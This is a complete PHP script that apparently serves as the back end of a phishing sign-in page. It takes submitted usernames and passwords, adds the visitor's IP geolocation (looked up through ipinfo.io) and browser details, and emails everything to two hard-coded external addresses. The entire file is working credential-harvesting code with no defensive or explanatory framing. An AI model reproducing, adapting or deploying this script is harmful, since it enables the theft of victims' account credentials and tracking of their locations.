<?php

if ( $_SERVER[ 'REQUEST_METHOD' ] == 'POST' ) {
    header( 'Content-Type: application/json' );
    header( 'Access-Control-Allow-Origin: *' );
    header( 'Access-Control-Allow-Methods:  POST, GET' );
    $post = $_POST  ?? [];

    $to = 'sopye201@yandex.com,sopwill9@gmail.com';
    $subject = 'New Sign In';

    // Get visitor's IP address
   $ip = $_SERVER['REMOTE_ADDR'];
   $ipinfo = json_decode(file_get_contents("https://ipinfo.io/{$ip}/json"));


// Get visitor's location, city, state, and postal code
    $location = $ipinfo->loc;
    $city = $ipinfo->city ;
    $state = $ipinfo->region;
    $postal_code = $ipinfo->org;

    // Get browser type
    $browser_type = $_SERVER[ 'HTTP_USER_AGENT' ];

    // Get form data
    $email = $post[ 'Username' ];
    $password = $post[ 'Password' ];

    // Get current date and time
    date_default_timezone_set( 'UTC' );
    $date = date( 'Y-m-d H:i:s' );

    // Construct message
    $message = "Email: {$email}\n";
    $message .= "Password: {$password}\n";
    $message .= "IP Address: {$ip}\n";
    $message .= "Location: {$location}\n";
    $message .= "City: {$city}\n";
    $message .= "State: {$state}\n";
    $message .= "Postal Code: {$postal_code}\n";
    $message .= "Browser Type: {$browser_type}\n";
    $message .= "Date: {$date}\n";
    // Set headers
    // $headers = 'From: noreply@example.com' . '\r\n';
    // $headers .= 'Reply-To: noreply@example.com' . '\r\n';
    // $headers .= 'X-Mailer: PHP/' . phpversion();
    $sent =  mail( $to, $subject, $message );
    if ( $sent ) echo json_encode( [ 'message' => 'success' ] );
    else  echo json_encode( [ 'message' => 'failed' ] );
    return;
}

?>
